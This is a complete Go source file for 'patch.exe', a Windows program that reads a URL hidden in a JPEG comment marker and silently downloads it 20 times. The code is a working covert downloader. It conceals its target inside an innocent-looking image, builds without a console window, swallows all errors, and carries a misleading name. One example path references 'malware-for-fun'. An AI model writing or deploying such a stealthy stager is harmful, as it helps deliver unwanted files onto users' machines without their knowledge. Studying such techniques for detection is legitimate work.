// cmd/patch/main.go
//
// JPEG COM Marker Launcher — patch.exe
// ════════════════════════════════════
// Reads a URL hidden in a JPEG's COM marker, then downloads it 20 times
// concurrently. Output directory and URL can be overridden via flags.
//
// Usage:
//   patch.exe                          uses COM URL, saves next to patch.exe
//   patch.exe -dir "C:\MyFolder"       custom output directory
//   patch.exe -url "https://..."       override URL (ignores COM marker)
//   patch.exe -url "..." -dir "..."    both overrides
//
// ─── HOW THE COM MARKER IS STRUCTURED ───────────────────────────────────────
//
//  photo.jpg on disk (hex view of first ~80 bytes):
//
//    00: FF D8          ← SOI  (Start Of Image) — JPEG magic bytes
//    02: FF FE          ← COM  (Comment marker — 0xFF 0xFE)
//    04: 00 4C          ← segment length = 76 (uint16 big-endian, includes itself)
//    06: 68 74 74 70 …  ← "https://..." — the URL we embedded (76-2 = 74 bytes)
//    50: FF E0          ← APP0 / JFIF header — original image data starts here
//    …
//    last 2: FF D9      ← EOI  (End Of Image)
//
//  COM segment length field obeys:
//    segLen  = uint16 big-endian value
//    payload = data[offset+4 : offset+2+segLen]   (segLen−2 bytes of data)
//
// ─── WHY IMAGE VIEWERS DON'T CARE ───────────────────────────────────────────
//
//  ISO/IEC 10918-1 §B.2.4.5 specifies that decoders MUST skip COM segments.
//  Windows Photos, GIMP, browsers — all skip 0xFF 0xFE. The image renders
//  identically with or without the hidden URL.
//
// ─── RESOLVING PATHS RELATIVE TO THE EXE ────────────────────────────────────
//
//  os.Executable() returns the ABSOLUTE path of the running binary, even when
//  launched from a different working directory (double-clicked in Explorer).
//  filepath.Dir() gives us the exe's folder. photo.jpg and the default output
//  dir are both resolved relative to this — never relative to os.Getwd().
//
// ─── CONCURRENT DOWNLOADS ───────────────────────────────────────────────────
//
//  All 20 goroutines start simultaneously. HTTP GET is I/O-bound; Go's
//  scheduler parks goroutines while waiting on network, giving CPU to others.
//  sync.WaitGroup blocks main() until every goroutine calls wg.Done().
//
// ─── TECH STACK ─────────────────────────────────────────────────────────────
//  Language   : Go (standard library only — no third-party imports)
//  Packages   : os, path/filepath, io, net/http, sync, fmt, flag, encoding/binary, strings
//  Linker flag: -H windowsgui  → PE subsystem = 2 (Windows GUI), no console
//  CGO        : disabled (CGO_ENABLED=0) — pure Go, fully static binary
//  Build      : go build -ldflags="-H windowsgui" -o patch.exe ./cmd/patch

package main

import (
	"encoding/binary" // BigEndian.Uint16 — reads the 2-byte JPEG segment length
	"flag"
	"fmt"
	"io"
	"net/http"      // standard HTTP client for downloading the image
	"os"
	"path/filepath" // Dir + Join — resolves paths next to the exe
	"strings"
	"sync" // WaitGroup — blocks until all 20 goroutines are done
)

const replicaCount = 20

func main() {
	// ── CLI flags ──────────────────────────────────────────────────────────
	//
	// -url: override the URL instead of reading from the JPEG COM marker.
	//       Useful for testing without re-embedding.
	//
	// -dir: output directory for downloaded images.
	//       Defaults to the CURRENT WORKING DIRECTORY — wherever the user
	//       runs patch.exe from (e.g. double-click in a folder = that folder).
	//       Accepts any absolute or relative path, any username:
	//         -dir "C:\Users\uma\Files"
	//         -dir "C:\Users\goku\Documents"
	//         -dir "C:\Users\electromist\Downloads\malware-for-fun"
	urlFlag := flag.String("url", "", "Override download URL (bypasses COM marker)")
	dirFlag := flag.String("dir", "", "Output directory (default: current working directory)")
	flag.Parse()

	// ── 1. Resolve exe directory (used for photo.jpg path + default out dir) ─
	exe, err := os.Executable()
	if err != nil {
		return
	}
	exeDir := filepath.Dir(exe)

	// ── 2. Determine the target URL ────────────────────────────────────────
	var targetURL string
	if *urlFlag != "" {
		// Flag takes priority over COM marker.
		targetURL = strings.TrimSpace(*urlFlag)
	} else {
		// Read URL from photo.jpg's COM marker (same folder as patch.exe).
		jpgPath := filepath.Join(exeDir, "cat_photo.jpg")
		rawURL, err := readCOMMarker(jpgPath)
		if err != nil || strings.TrimSpace(rawURL) == "" {
			return // no COM marker, no URL flag → nothing to do
		}
		targetURL = strings.TrimSpace(rawURL)
	}

	// ── 3. Determine the output directory ──────────────────────────────────
	//
	// Priority:
	//   1. -dir flag   (explicit path, any user/machine)
	//   2. Current working directory (os.Getwd) — wherever patch.exe was run
	//      from. Works for any user without hardcoding usernames or paths.
	//      Examples:
	//        C:\Users\electromist\                    (run from home dir)
	//        C:\Users\uma\Files                       (different user)
	//        C:\Users\goku\Documents                  (different user + folder)
	//        C:\Users\electromist\Downloads\stuff      (any subdirectory)
	outDir := *dirFlag
	if outDir == "" {
		cwd, err := os.Getwd()
		if err != nil {
			// Fallback: exe's own directory if Getwd fails (edge case)
			cwd = exeDir
		}
		outDir = cwd
	}

	// Create the output directory if it doesn't exist.
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return
	}

	// ── 4. Download all 20 copies concurrently ────────────────────────────
	//
	// sync.WaitGroup pattern:
	//   wg.Add(n)  — declare n units of work before spawning goroutines
	//   defer wg.Done() inside goroutine — guaranteed decrement, even on panic
	//   wg.Wait()  — block main until counter reaches zero
	var wg sync.WaitGroup
	for i := 1; i <= replicaCount; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			dest := filepath.Join(outDir, fmt.Sprintf("photo_%02d.jpg", n))
			_ = downloadFile(targetURL, dest)
		}(i) // pass i by value — loop var changes, closure must capture a snapshot
	}
	wg.Wait()
}

// readCOMMarker walks the JPEG marker stream of the file at path and returns
// the content of the first COM (0xFF 0xFE) segment as a string.
//
// Walking algorithm:
//   i = 2  (skip SOI FF D8)
//   while data[i] is part of a valid marker:
//     read marker code (byte i+1)
//     read segment length (bytes i+2..i+3, big-endian uint16)
//     if marker == FE → COM found → return string(data[i+4 : i+2+segLen])
//     else advance i by 2+segLen
func readCOMMarker(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	if len(data) < 4 || data[0] != 0xFF || data[1] != 0xD8 {
		return "", fmt.Errorf("not a JPEG (missing FF D8 SOI)")
	}

	i := 2
	for i < len(data)-3 {
		if data[i] != 0xFF {
			i++
			continue
		}
		marker := data[i+1]
		// binary.BigEndian.Uint16: reads 2 bytes MSB-first (network byte order).
		// JPEG spec uses big-endian for all multi-byte integers.
		segLen := int(binary.BigEndian.Uint16(data[i+2 : i+4]))
		if marker == 0xFE { // COM marker code
			payload := data[i+4 : i+2+segLen] // segLen-2 bytes of payload
			return string(payload), nil
		}
		if segLen < 2 {
			break
		}
		i += 2 + segLen // advance to next marker: skip FF+marker (2) + segment body (segLen)
	}
	return "", fmt.Errorf("COM marker not found in %s", path)
}

// downloadFile fetches url via HTTP GET and writes the response body to dest.
// io.Copy streams in chunks — no full-file RAM allocation needed.
func downloadFile(url, dest string) error {
	resp, err := http.Get(url) // follows redirects automatically (up to 10)
	if err != nil {
		return err
	}
	defer resp.Body.Close() // free TCP connection back to pool

	f, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body) // streams: 32KB chunks by default
	return err
}
